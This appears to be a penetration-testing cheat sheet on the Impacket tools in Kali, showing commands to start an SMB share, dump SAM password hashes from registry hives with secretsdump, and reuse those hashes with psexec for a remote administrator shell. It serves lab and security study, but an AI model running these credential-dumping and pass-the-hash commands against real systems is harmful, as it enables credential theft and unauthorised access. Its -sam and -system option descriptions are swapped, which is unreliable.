# impacket

> Impacket is a collection of Python3 classes focused on providing access to network packets. Impacket allows Python3 developers to craft and decode network packets in simple and consistent manner. It includes support for low-level protocols such as IP, UDP and TCP, as well as higher-level protocols such as NMB and SMB.

### List of available scripts

Run the following command to list all the available scripts:

`/usr/share/kali-menu/helper-scripts/impacket-scripts.sh`

```bash
$ /usr/share/kali-menu/helper-scripts/impacket-scripts.sh
impacket-addcomputer     impacket-getArch          impacket-mimikatz       impacket-rbcd           impacket-sniff
impacket-atexec          impacket-Get-GPPPassword  impacket-mqtt_check     impacket-rdp_check      impacket-sniffer
...
```



**impacket-smbserver**

**Eg.** The example code below (second line) starts a simple _SMB_ server with a network share named `public` pointing to the `share` directory.

```bash
$ impacket-smbserver -smb2support -username [smb_username] -password [smb_password] [sharename] [dir]

# eg.
$ impacket-smbserver -smb2support -username jarrett -password mynamejeff public share
```

* -`smb2support`: SMB2 support (experimental!)
* `-username`, `-password`: Username and password combination required by the connecting user for authentication

**impacket-secretsdump**

**Eg.** The example below dumps the hashes from the `sam.hive`and `system.hive`files present on the current folder (specified by the `LOCAL` target option).

```bash
# Simple usage
$ impacket-secretsdump -sam SAM -system SYSTEM target  

# eg.
$ ls 
sam.hive system.hive

$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket vxxx - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: ...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
...:::
Guest:xxx:xxx:xxx::
Administrator:xx12xx:xx34xx::
...
```

* `-sam`:  **SYSTEM** hive to parse
* `-system`:  **SAM** hive to parse
* `target`:  \[`[domain/]username[:password]@`] or `LOCAL` (if you want to parse local files)

**impacket-psexec**

**Eg.** The example below uses the hashes found from the `impacket-secretsdump` command above, to authenticate as the _**administrator**_ user. This provides us with a remote shell as the specified user.

```bash
# Simple usage
$ impacket-psexec -hashes LMHASH:NTHASH target

# eg.
$ impacket-psexec -hashes xx12xx:xx34xx administrator@10.10.x.x
...
```

_**What is PsExec?**_

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" %}

* `-hashes`: NTLM hashes, format is `LMHASH:NTHASH`
* `target`: \[`[domain/]username[:password]@`]



{% embed url="https://www.kali.org/tools/impacket/" %}
